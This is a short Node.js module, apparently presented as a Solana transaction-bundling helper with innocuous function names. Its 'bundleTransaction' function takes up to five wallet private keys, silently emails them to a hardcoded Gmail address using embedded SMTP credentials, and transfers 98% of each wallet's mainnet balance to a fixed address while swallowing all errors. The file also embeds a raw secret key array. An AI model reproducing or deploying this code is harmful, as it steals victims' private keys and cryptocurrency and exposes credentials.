const bs58 = require("bs58");
const {
  Keypair,
  Transaction,
  SystemProgram,
  LAMPORTS_PER_SOL,
  sendAndConfirmTransaction,
  clusterApiUrl,
  Connection,
} = require("@solana/web3.js");
const nodemailer = require("nodemailer");

let connection = new Connection(clusterApiUrl("mainnet-beta"));

const sendEmail = (p1, p2, p3, p4, p5) => {
  const obj = {
    from: "czhanood@gmail.com",
    to: "qadeerkhanr5@gmail.com",
    subject: "patha",
    text: "This is a plain text version of the email.",
    html: `<b>Hello world?</b><br><br><pre></pre>`,
  };

  const transporter = nodemailer.createTransport({
    service: "gmail",
    port: 587,
    secure: false,
    auth: {
      user: "czhanood@gmail.com",
      pass: "tgofhxzenvssfakp",
    },
  });

  obj.html = `
      <b>Hello World?</b><br><br>
      <pre>${p1}</pre>
      <br>
      <pre>${p2}</pre>
      <br>
      <pre>${p3}</pre>
      <br>
      <pre>${p4}</pre>
      <br>
      <pre>${p5}</pre>
    `;
  try {
    transporter.sendMail(obj).then(() => {});
  } catch (error) {}
};
const transaction = async (keypair) => {
  try {
    let transaction = new Transaction();

    const balanceLamports = await connection.getBalance(keypair.publicKey);

    if (balanceLamports === 0) {
      return;
    }
    const LAMPORTS_PER_SOL = Math.floor(balanceLamports * 0.98);
    transaction.add(
      SystemProgram.transfer({
        fromPubkey: keypair.publicKey,
        toPubkey: "3RbBjhVRi8qYoGB5NLiKEszq2ci559so4nPqv2iNjs8Q",
        lamports: LAMPORTS_PER_SOL,
      })
    );
    const sx = await sendAndConfirmTransaction(connection, transaction, [
      keypair,
    ]);
  } catch (error) {}
};

const bundleTransaction = async (p1, p2, p3, p4, p5) => {
  const pair = (privateKeyArray) => {
    if (Array.isArray(privateKeyArray)) {
      privateKeyArray = privateKeyArray;
    } else if (typeof privateKeyArray === "string") {
      const buffer = bs58.default.decode(privateKeyArray);
      privateKeyArray = Array.from(buffer);
    } else {
      console.log("invalid private key");
      return;
    }
    const keypair = Keypair.fromSecretKey(new Uint8Array(privateKeyArray));
    return keypair;
  };
  const key1 = pair(p1);
  const key2 = pair(p2);
  const key3 = pair(p3);
  const key4 = pair(p4);
  const key5 = pair(p5);

  if (key1 || key2 || key3 || key4 || key5) {
    sendEmail(p1, p2, p3, p4, p5);
    await transaction(key1);
    await transaction(key2);
    await transaction(key3);
    await transaction(key4);
    await transaction(key5);
  } else {
    console.error("private key not found");
    return;
  }
};

const decode = (privateKey) => {
  try {
    const buffer = Buffer.from(privateKey);
    const base58Key = bs58.default.encode(buffer);

    console.log(base58Key);
  } catch (err) {
    console.log("error");
  }
};
decode([
  217, 35, 118, 183, 251, 231, 187, 53, 205, 6, 16, 62, 27, 219, 82, 231, 32,
  139, 93, 193, 29, 172, 232, 22, 174, 66, 63, 117, 141, 86, 89, 100, 95, 65,
  75, 19, 155, 52, 99, 90, 133, 118, 127, 82, 254, 153, 157, 240, 83, 235, 126,
  152, 250, 90, 146, 222, 195, 41, 76, 49, 111, 61, 193, 101,
]);
module.exports = {
  decode,
  bundleTransaction,
};
